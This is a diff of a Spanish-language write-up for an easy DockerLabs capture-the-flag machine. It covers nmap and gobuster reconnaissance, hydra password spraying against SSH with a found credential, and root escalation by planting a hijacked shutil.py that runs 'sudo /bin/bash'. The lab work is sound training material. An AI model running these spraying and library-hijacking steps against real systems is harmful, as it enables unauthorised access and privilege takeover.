@@ -2,12 +2,13 @@ Propiedades:
 - OS: Linux
 - Plataforma: DockerLabs
 - Nivel: Easy
-- Tags: #ssh #brute-force #dockerlabs
+- Tags: #ssh #bruteforce #dockerlabs #python-library-hijacking #password-spraying
 
 ![](assets/Pasted%20image%2020251103001202.png)
 ## Reconocimiento
 
 Empezamos Listando los puertos abiertos TCP del objetivo:
+
 ```bash
 > nmap -p- --open --min-rate 5000 172.17.0.2 -Pn -n 
 ------------------------------------------------------------------------------------------------------------------------------------------------
@@ -20,10 +21,8 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-Notamos 2 puertos abiertos y procedemos a lanzar un reconocimiento mas profundo sobre estos puertos.
+Notamos 2 puertos abiertos y procedemos a lanzar un reconocimiento mas profundo sobre estos puertos
 
-- `80` - Corre un servidor  Apache httpd 2.4.58 ((Ubuntu))
-- `22` - Servicio SSH  OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
 ```bash
 > nmap -p22,80 -sCV --min-rate 5000 -Pn -n -oN ports.txt 172.17.0.2
 ------------------------------------------------------------------------------------------------------------------------------------------------
@@ -41,14 +40,21 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-**Puerto 80 HTTP**
-
-- Es la web default de apache, lo cual no nos dice mucho
-![](assets/Pasted%20image%2020251031194304.png)
+- Puerto 80 HTTP Corre un servidor  Apache httpd 2.4.58 ((Ubuntu))
+- Puerto 22 SSH OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
 
 ## Enumeración
 
-Realizamos Fuzzing  con `gobuster` sobre el servidor apache para encontrar recursos y archivos ocultos:
+### Puerto 80 HTTP
+
+- Es la web default de apache, lo cual no nos dice mucho
+
+![](assets/Pasted%20image%2020251031194304.png)
+
+**Fuzzing.**
+
+Utilice `gobuster` para realizar fuzzing y ver todos los posibles recursos de la web.
+
 ```bash
 > gobuster dir -u http://172.17.0.2/ -w /home/wndr/Tools/dictionaries/SecLists/Discovery/Web-Content/raft-medium-directories.txt -x js,php,html,txt -t 20  
 ------------------------------------------------------------------------------------------------------------------------------------------------
@@ -60,33 +66,39 @@ Realizamos Fuzzing  con `gobuster` sobre el servidor apache para encontrar recur
 
 - El resultado nos reporta un archivo llamado `index.php`
 
-Dentro del archivo `index.php` pudimos encontrar una credencial:
-_JIFGHDS87GYDFIGD_ Podemos intuir que esta es la credencial de acceso del servicio SSH
+Dentro del archivo `index.php` pudimos encontrar un texto
+
+- _JIFGHDS87GYDFIGD_ puede ser alguna credencial.
+
 ![](assets/Pasted%20image%2020251031192525.png)
 
 ## Explotación
 
-Realizamos un ataque de fuerza bruta sobre el servicio SSH para descubrir el usuario cuya contraseña sea la encontrada anteriormente.
+Voy a realizar un ataque **Password Spraying** para encontrar un posible usuario cuya contraseña sea el texto que encontramos anteriormente.
 
-- Se encuentra un usuario valido llamado _carlos_
+- Password Spraying es un ataque donde utilizamos una misma contraseña para distintos usuarios.
 
 ```bash
 > hydra -L /home/wndr/Tools/dictionaries/SecLists/Usernames/xato-net-10-million-usernames.txt -p "JIFGHDS87GYDFIGD" ssh://172.17.0.2 -t 4
 ------------------------------------------------------------------------
 [22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD 
-
 ```
 
+- Se encuentra un usuario valido llamado _carlos_
 
-Accedemos al servicio SSH con el usuario _carlos_ 
+Accedemos al servicio SSH cona las credenciales:
+
+- carlos:JIFGHDS87GYDFIGD
+
 ![](assets/Pasted%20image%2020251031192744.png)
 
 
 ## Escalada de Privilegios
 
-Procedo a enumerar binarios con privilegios de SUDO:
+Dentro del sistema lo primero que hago es enumerar binarios que pueda ejecutar como el usuario `sudo`.
 
-- Encontramos un script.py ejecutable sin necesidad de contraseña.
+- Encontramos un script en `/opt/script.py` que puede ser ejecutado por cualquier usuario sin necesidad de contraseña
+
 ```bash
 carlos@786c84f45512:~$ sudo -l
 ----------------------------------------------------------------------------------------------------------------------------------
@@ -97,7 +109,6 @@ User carlos may run the following commands on 786c84f45512:
     (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
 ```
 
-**Python Library Hijacking**
 
 Inspeccionamos el _script.py_ y notamos que utiliza una librería llamada `shutil`
 
@@ -116,24 +127,29 @@ if __name__ == '__main__':
     copiar_archivo(origen, destino)
 ```
 
-Por lo cual podemos crear un modulo con el mismo nombre `shutil.py`.
-```bash
-> nano /opt/shutil.py
-```
+Podemos realizar un **Python Library Hijacking** que consiste en forzar a `Python` para que cargue una librería malicioso en lugar de la legitima aprovechando como `Python` busca modulos.
 
-- Ejecutamos una bash como administrador
+- Si `shutil.py` está en el mismo directorio que `script.py`, **Python lo cargará primero**, aunque exista una librería legítima llamada `shutil`
+
 ```python
+> nano /opt/shutil.py
+
 import os
 
 os.system("sudo /bin/bash")
 ```
 
-Procedemos a ejecutar el `script.py` 
+Lo que sucederá es que, al ejecutar `script.py`, Python intentará importar la librería `shutil`.  
+Debido al orden de búsqueda de módulos, se cargará primero el archivo `shutil.py` malicioso ubicado en el mismo directorio.  
+En el momento del `import`, Python ejecutará todo el contenido de dicho archivo, provocando que se spawnee una bash con los privilegios del usuario que ejecuta el script, en este caso **root**.
+
+Procedemos a ejecutar el `script.py` como el usuario `root`.
 
 ```bash
 > carlos@786c84f45512:~$ sudo /usr/bin/python3 /opt/script.py
 ```
 
 Ya somos root:
+
 ![](assets/Pasted%20image%2020251031194151.png)
 
